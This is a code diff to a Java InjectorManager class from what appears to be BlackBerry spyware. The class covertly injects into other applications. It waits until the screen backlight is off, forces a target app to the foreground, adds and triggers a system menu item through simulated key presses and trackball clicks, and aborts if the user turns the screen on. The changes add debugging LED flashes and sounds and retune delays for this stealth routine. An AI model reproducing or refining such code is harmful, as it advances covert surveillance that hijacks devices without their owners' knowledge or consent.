@@ -204,6 +204,11 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
         debug.trace("injectAll " + injector);
         //#endif
 
+        boolean wantLight = Status.self().wantLight();
+        //#ifdef BBM_DEBUG
+        wantLight = true;
+        //#endif
+        
         if (!injector.enabled()) {
             //#ifdef DEBUG
             debug.trace("injectAll, disabled: " + injector);
@@ -238,18 +243,40 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
         status.setBacklight(false);
         manager.requestForegroundForConsole();
 
+        if (wantLight) {
+            Debug.ledFlash(Debug.COLOR_RED);
+        }
+        
         unLock();
-
+        
+        if (wantLight) {
+            Debug.ledStart(Debug.COLOR_ORANGE);
+        }
+        
+        //#ifndef BBM_DEBUG
         Utils.sleep(Utils.randomInt(5, 10) * 1000);
+        //#endif
+        
+        if (wantLight) {
+            Debug.ledStop();
+        }
 
         if (status.backlightEnabled()) {
             //#ifdef DEBUG
             debug.trace("inject, backlight, bailing out");
             //#endif
+            if (wantLight) { Debug.playSoundError(1); }         
             return false;
         }
         
+        if (wantLight) {
+            Debug.ledFlash(Debug.COLOR_YELLOW);
+        }
         if (requestForeground(name)) {
+            if (wantLight) {
+                Debug.ledFlash(Debug.COLOR_GREEN);
+            }
+            
             //#ifdef DEBUG
             debug.trace("inject, executed: " + name);
             //#endif
@@ -258,28 +285,41 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
                 //#ifdef DEBUG
                 debug.trace("inject, backlight, bailing out");
                 //#endif
+                if (wantLight) { Debug.playSoundError(2); }
                 return false;
             }
             injector.incrTries();
 
-            Utils.sleep(500);
+            Utils.sleep(1000);
             if (checkForeground(name)) {
 
                 if (status.backlightEnabled()) {
                     //#ifdef DEBUG
                     debug.trace("inject, backlight, bailing out");
                     //#endif
+                    if (wantLight) { Debug.playSoundError(3); }
                     return false;
                 }
 
+                if (wantLight) {
+                    Debug.ledFlash(Debug.COLOR_BLUE_LIGHT);
+                }
+                
                 addSystemMenu(injector);
 
                 Utils.sleep(300);
                 callSystemMenu();
-                Utils.sleep(300);
+                Utils.sleep(600);
+                //if (checkForeground(name)) {
+                //    callSystemMenuRecover();
+                //}
+                
                 removeSystemMenu();
 
                 manager.requestForegroundForConsole();
+                if (wantLight) {
+                    Debug.ledFlash(Debug.COLOR_WHITE);
+                }
             }
         }
         return false;
@@ -325,7 +365,7 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
         debug.trace("callSystemMenu");
         //#endif
 
-        int waitTime = 300;
+        int waitTime = 500;
 
         //#ifdef BBM_DEBUG
         Status.self().setBacklight(true);
@@ -353,11 +393,18 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
             KeyInjector.pressRawKey(menu.toString().toLowerCase().charAt(0));
         }
 
-        Utils.sleep(waitTime);
+        Utils.sleep(waitTime);        
         KeyInjector.trackBallRawClick();
-        Utils.sleep(waitTime);
-        KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
+        //KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
+        //Utils.sleep(waitTime);
+        //KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
 
+    }
+
+    private void callSystemMenuRecover() {
+        KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
+        Utils.sleep(500);
+        KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
     }
 
     /**
